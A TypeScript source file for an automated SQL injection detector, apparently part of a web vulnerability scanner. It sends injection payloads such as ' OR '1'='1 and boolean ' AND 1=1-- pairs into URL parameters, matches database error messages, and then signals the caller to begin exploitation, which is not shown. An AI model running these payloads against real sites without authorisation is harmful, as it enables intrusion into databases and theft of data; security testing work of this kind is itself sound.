/**
 * Event-Driven SQLi Detector
 * 
 * CRITICAL DESIGN PRINCIPLES:
 * 1. Stop fuzzing IMMEDIATELY when SQL signal detected
 * 2. Run confirmation (2-3 payloads max)
 * 3. Create sqliContext with working payload
 * 4. Trigger IMMEDIATE exploitation
 * 5. NO brute-force payload loops
 * 6. Per-parameter isolation
 */

import {
  SQLiContext,
  SQLSignalEvent,
  ConfirmationCompleteEvent,
  ParameterExecutionContext,
  createSQLiContext,
  createParameterContext,
  SQLiTechnique,
} from "./sqli-context";
import { DatabaseType } from "./modules/sqli";
import { makeRequest, RequestResult, sleep, hashString } from "./utils";

/**
 * Signal detection result
 */
interface SignalDetectionResult {
  detected: boolean;
  payload: string;
  technique: SQLiTechnique;
  evidence: string;
  dbType?: DatabaseType;
  responseTime: number;
  bodyHash: string;
  status: number;
}

/**
 * Confirmation result
 */
interface ConfirmationResult {
  confirmed: boolean;
  confidence: number;
  confirmationCount: number;
  workingPayload: string;
  technique: SQLiTechnique;
  dbType: DatabaseType;
  evidence: string;
}

/**
 * Event-Driven SQLi Detector
 * 
 * This class implements immediate exploitation model:
 * Detect → STOP → Confirm → Exploit IMMEDIATELY
 */
export class EventDrivenSQLiDetector {
  private parameterContexts = new Map<string, ParameterExecutionContext>();
  private onSignalDetected?: (signal: SQLSignalEvent) => Promise<void>;
  private onConfirmationComplete?: (event: ConfirmationCompleteEvent) => Promise<void>;
  private logger: (level: string, message: string, metadata?: any) => Promise<void>;
  
  constructor(
    logger: (level: string, message: string, metadata?: any) => Promise<void>,
    options?: {
      onSignalDetected?: (signal: SQLSignalEvent) => Promise<void>;
      onConfirmationComplete?: (event: ConfirmationCompleteEvent) => Promise<void>;
    }
  ) {
    this.logger = logger;
    this.onSignalDetected = options?.onSignalDetected;
    this.onConfirmationComplete = options?.onConfirmationComplete;
  }
  
  /**
   * Test parameter with event-driven detection
   * Returns TRUE if exploitation should happen immediately
   */
  async testParameter(
    url: string,
    parameter: string,
    baseline: {
      responseTime: number;
      bodyHash: string;
      status: number;
      body: string;
    }
  ): Promise<{
    vulnerable: boolean;
    context?: SQLiContext;
    shouldExploit: boolean;
  }> {
    const paramKey = `${url}:${parameter}`;
    let paramContext = this.parameterContexts.get(paramKey);
    
    if (!paramContext) {
      paramContext = createParameterContext(url, parameter);
      this.parameterContexts.set(paramKey, paramContext);
    }
    
    // If already confirmed, don't test again
    if (paramContext.confirmed) {
      return {
        vulnerable: true,
        context: paramContext.confirmedContext,
        shouldExploit: false, // Already exploited
      };
    }
    
    await this.logger("info", `[EventDriven] Starting detection for parameter: ${parameter}`);
    
    // PHASE 1: FAST SIGNAL DETECTION (not brute-force)
    // Send small, ordered payload set - STOP on first signal
    const signalResult = await this.detectSignal(url, parameter, baseline, paramContext);
    
    if (!signalResult.detected) {
      await this.logger("info", `[EventDriven] No signal detected for ${parameter}`);
      paramContext.completed = true;
      return { vulnerable: false, shouldExploit: false };
    }
    
    // ⚡ SIGNAL DETECTED - STOP FUZZING IMMEDIATELY
    paramContext.signalDetected = true;
    paramContext.shouldStopFuzzing = true;
    paramContext.signalDetectedAt = Date.now();
    paramContext.firstSignal = {
      url,
      parameter,
      payload: signalResult.payload,
      technique: signalResult.technique,
      evidence: signalResult.evidence,
      detectedAt: Date.now(),
      shouldConfirm: true,
    };
    
    await this.logger("info", `⚡ [EventDriven] SIGNAL DETECTED for ${parameter} - STOPPING FUZZING`);
    
    // Emit signal event
    if (this.onSignalDetected) {
      await this.onSignalDetected(paramContext.firstSignal);
    }
    
    // PHASE 2: FAST CONFIRMATION (2-3 payloads max)
    paramContext.confirmationRunning = true;
    const confirmResult = await this.runConfirmation(
      url,
      parameter,
      signalResult,
      baseline,
      paramContext
    );
    paramContext.confirmationRunning = false;
    
    if (!confirmResult.confirmed) {
      await this.logger("warn", `[EventDriven] Confirmation FAILED for ${parameter}`);
      paramContext.completed = true;
      return { vulnerable: false, shouldExploit: false };
    }
    
    // ✅ CONFIRMATION PASSED - CREATE IMMUTABLE CONTEXT
    paramContext.confirmed = true;
    paramContext.confirmedAt = Date.now();
    
    const sqliContext = createSQLiContext({
      url,
      parameter,
      injectionType: confirmResult.technique,
      workingPayload: confirmResult.workingPayload,
      confirmedTechnique: `${confirmResult.technique} SQLi`,
      dbType: confirmResult.dbType,
      confidence: confirmResult.confidence,
      confirmationCount: confirmResult.confirmationCount,
      baseline: {
        responseTime: baseline.responseTime,
        bodyHash: baseline.bodyHash,
        status: baseline.status,
      },
      detectedAt: paramContext.signalDetectedAt,
    });
    
    paramContext.confirmedContext = sqliContext;
    
    await this.logger("info", `✅ [EventDriven] SQLi CONFIRMED for ${parameter} - confidence ${confirmResult.confidence}%`);
    
    // Emit confirmation event - this triggers IMMEDIATE exploitation
    if (this.onConfirmationComplete) {
      await this.onConfirmationComplete({
        context: sqliContext,
        shouldExploit: true,  // ⚡ EXPLOIT IMMEDIATELY
      });
    }
    
    return {
      vulnerable: true,
      context: sqliContext,
      shouldExploit: true,  // Signal to caller: exploit NOW
    };
  }
  
  /**
   * PHASE 1: Fast signal detection
   * Stop on FIRST signal, don't continue fuzzing
   */
  private async detectSignal(
    url: string,
    parameter: string,
    baseline: {
      responseTime: number;
      bodyHash: string;
      status: number;
      body: string;
    },
    paramContext: ParameterExecutionContext
  ): Promise<SignalDetectionResult> {
    // Small, ordered payload set (not brute-force)
    // Test error-based first (fastest, highest confidence)
    const errorPayloads = [
      { payload: "'", technique: "error-based" as SQLiTechnique },
      { payload: "\"", technique: "error-based" as SQLiTechnique },
      { payload: "' OR '1'='1", technique: "error-based" as SQLiTechnique },
      { payload: "') OR ('1'='1", technique: "error-based" as SQLiTechnique },
    ];
    
    await this.logger("info", `[Signal] Testing error-based signals for ${parameter}...`);
    
    for (const { payload, technique } of errorPayloads) {
      paramContext.payloadsSent++;
      
      if (paramContext.shouldStopFuzzing) {
        break;  // Early exit
      }
      
      const testUrl = this.injectPayload(url, parameter, payload);
      const response = await makeRequest(testUrl, { timeout: 10000 });
      
      if (response.error) {
        continue;  // Network error, try next
      }
      
      // Check for SQL error patterns
      const dbType = this.detectDatabaseFromError(response.body);
      if (dbType !== "unknown") {
        // ⚡ ERROR SIGNAL DETECTED - STOP IMMEDIATELY
        return {
          detected: true,
          payload,
          technique,
          evidence: `Database error detected: ${dbType}`,
          dbType,
          responseTime: response.responseTime,
          bodyHash: hashString(response.body),
          status: response.status,
        };
      }
      
      await sleep(50);  // Minimal pacing
    }
    
    // If no error signals, try boolean-based (1-2 payloads only)
    await this.logger("info", `[Signal] Testing boolean-based signals for ${parameter}...`);
    
    const booleanTests = [
      { true: "' AND 1=1--", false: "' AND 1=2--" },
    ];
    
    for (const test of booleanTests) {
      if (paramContext.shouldStopFuzzing) break;
      
      const trueUrl = this.injectPayload(url, parameter, test.true);
      const falseUrl = this.injectPayload(url, parameter, test.false);
      
      const trueResp = await makeRequest(trueUrl, { timeout: 10000 });
      const falseResp = await makeRequest(falseUrl, { timeout: 10000 });
      
      paramContext.payloadsSent += 2;
      
      if (trueResp.error || falseResp.error) continue;
      
      const trueHash = hashString(trueResp.body);
      const falseHash = hashString(falseResp.body);
      
      // Check for differential behavior
      if (trueHash !== falseHash && trueHash !== baseline.bodyHash) {
        // ⚡ BOOLEAN SIGNAL DETECTED - STOP
        return {
          detected: true,
          payload: test.true,
          technique: "boolean-blind",
          evidence: `Boolean differential detected (true≠false)`,
          responseTime: trueResp.responseTime,
          bodyHash: trueHash,
          status: trueResp.status,
        };
      }
    }
    
    // No signals detected
    return {
      detected: false,
      payload: "",
      technique: "error-based",
      evidence: "",
      responseTime: 0,
      bodyHash: "",
      status: 0,
    };
  }
  
  /**
   * PHASE 2: Fast confirmation (2-3 payloads max)
   * Verify the signal is stable, not false positive
   */
  private async runConfirmation(
    url: string,
    parameter: string,
    signalResult: SignalDetectionResult,
    baseline: { responseTime: number; bodyHash: string; status: number },
    paramContext: ParameterExecutionContext
  ): Promise<ConfirmationResult> {
    await this.logger("info", `[Confirmation] Verifying signal for ${parameter} (max 3 attempts)...`);
    
    const maxAttempts = 3;
    let successCount = 0;
    
    for (let i = 0; i < maxAttempts; i++) {
      paramContext.confirmationAttempts++;
      
      const testUrl = this.injectPayload(url, parameter, signalResult.payload);
      const response = await makeRequest(testUrl, { timeout: 10000 });
      
      if (response.error) {
        await this.logger("warn", `[Confirmation] Attempt ${i + 1} failed: ${response.error}`);
        continue;
      }
      
      // Verify signal is consistent
      let isConsistent = false;
      
      if (signalResult.technique === "error-based") {
        const dbType = this.detectDatabaseFromError(response.body);
        isConsistent = dbType !== "unknown";
      } else if (signalResult.technique === "boolean-blind") {
        const responseHash = hashString(response.body);
        isConsistent = responseHash === signalResult.bodyHash;
      }
      
      if (isConsistent) {
        successCount++;
      }
      
      await sleep(100);
    }
    
    // Calculate confidence
    const confidence = Math.round((successCount / maxAttempts) * 100);
    const confirmed = successCount >= 2;  // At least 2/3 must succeed
    
    if (confirmed) {
      await this.logger("info", `[Confirmation] PASSED: ${successCount}/${maxAttempts} consistent - confidence ${confidence}%`);
    }
    
    return {
      confirmed,
      confidence,
      confirmationCount: successCount,
      workingPayload: signalResult.payload,
      technique: signalResult.technique,
      dbType: signalResult.dbType || "unknown",
      evidence: signalResult.evidence,
    };
  }
  
  /**
   * Detect database type from error message
   */
  private detectDatabaseFromError(body: string): DatabaseType {
    const patterns: Record<DatabaseType, RegExp[]> = {
      mysql: [
        /SQL syntax.*MySQL/i,
        /mysql_fetch/i,
        /Warning.*mysql_/i,
        /You have an error in your SQL syntax/i,
      ],
      postgresql: [
        /PostgreSQL.*ERROR/i,
        /pg_query/i,
        /unterminated quoted string/i,
      ],
      mssql: [
        /SQL Server/i,
        /ODBC.*SQL Server/i,
        /Microsoft.*ODBC/i,
      ],
      oracle: [
        /ORA-\d{5}/i,
        /Oracle error/i,
      ],
      sqlite: [
        /SQLite.*error/i,
        /sqlite3\./i,
      ],
      unknown: [],
    };
    
    for (const [dbType, regexList] of Object.entries(patterns)) {
      for (const regex of regexList) {
        if (regex.test(body)) {
          return dbType as DatabaseType;
        }
      }
    }
    
    return "unknown";
  }
  
  /**
   * Inject payload into URL parameter
   */
  private injectPayload(url: string, parameter: string, payload: string): string {
    const urlObj = new URL(url);
    urlObj.searchParams.set(parameter, payload);
    return urlObj.toString();
  }
  
  /**
   * Check if parameter should stop fuzzing
   */
  shouldStopFuzzing(url: string, parameter: string): boolean {
    const paramKey = `${url}:${parameter}`;
    const context = this.parameterContexts.get(paramKey);
    return context?.shouldStopFuzzing || false;
  }
  
  /**
   * Get parameter context
   */
  getParameterContext(url: string, parameter: string): ParameterExecutionContext | undefined {
    const paramKey = `${url}:${parameter}`;
    return this.parameterContexts.get(paramKey);
  }
}
